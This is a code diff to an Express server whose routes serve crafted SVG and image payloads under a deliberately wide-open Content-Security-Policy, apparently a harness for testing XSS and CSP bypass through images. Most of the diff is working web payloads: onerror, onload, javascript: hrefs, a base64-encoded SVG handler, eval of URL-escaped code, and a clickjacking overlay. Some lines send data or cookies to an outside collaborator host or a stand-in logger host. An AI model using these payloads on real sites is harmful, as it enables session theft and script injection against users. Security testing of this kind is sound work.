@@ -165,8 +165,8 @@ app.get('/image-external-src.svg', (req, res) => {
   res.setHeader('Content-Type', 'image/svg+xml');
   res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
   res.send(`
-    <svg xmlns="http://www.w3.org/2000/svg">
-      <image href="https://kani-collaborator.onrender.com/?cookie={document.cookie}" />
+    <svg xmlns="http://www.w3.org/2000/svg">      
+        <image href="https://kani-collaborator.onrender.com/?data=stolen_data" onerror="alert('XSS')" />
     </svg>
   `);
 });
@@ -226,6 +226,89 @@ app.get('/image-html-form.svg', (req, res) => {
           </form>
         </div>
       </foreignObject>
+    </svg>
+  `);
+});
+
+app.get('/image-href.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+   <svg xmlns="http://www.w3.org/2000/svg">
+      <image href="javascript:alert('CSP bypass');" />
+    </svg>
+  `);
+});
+
+app.get('/image-data.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/gif');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+   <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzdHJvbmcgb25sb2FkPSJhbGVydCgnTWFsaWNpb3VzIEV4cGVyaWVuY2UnKTsgYWxlcnQoJ0V4cGVyaWVuY2UnKTsgYWxlcnQoIlNob3cgdXAgYXBwbGllY2F0aW9uISIpOyIgfC8+PC9zdHJvbmc+PC9zdmc+Cg==" />
+  `);
+});
+
+
+app.get('/image-object-svg.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/gif');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+    <svg xmlns="http://www.w3.org/2000/svg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;">
+      <rect width="100%" height="100%" fill="transparent" onclick="alert('Clickjacked!')" />
+      <object type="image/svg+xml" data="https://kani-collaborator.onrender.com/image1.svg"></object>
+      <object onload=alert(1) type="image/svg+xml" data="https://kani-collaborator.onrender.com/image1.svg"></object>
+    </svg>
+  `);
+});
+
+app.get('/image-error-handler.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/gif');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+   <svg xmlns="http://www.w3.org/2000/svg">
+      <script>
+        try {
+          alert('Payload executed!');
+        } catch (e) {
+          console.log("hello there, aymen el kani")
+          fetch('https://your-logger.com/?error=' + e.message);
+        }
+      </script>
+    </svg>
+  `);
+});
+
+app.get('/image-double-encode.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/gif');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+   <svg xmlns="http://www.w3.org/2000/svg">
+      <script>eval(unescape('%61%6c%65%72%74%28%27%48%65%6c%6c%6f%27%29'));</script>
+    </svg>
+  `);
+});
+
+app.get('/image-embed.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/gif');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+      <embed src="https://kani-collaborator.onrender.com/image1.svg" type="image/svg+xml" width="500" height="500">
+  `);
+});
+
+app.get('/image-embed-in-svg.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/gif');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+   <svg xmlns="http://www.w3.org/2000/svg">
+      <embed src="https://kani-collaborator.onrender.com/image1.svg" type="image/svg+xml" width="500" height="500">
     </svg>
   `);
 });
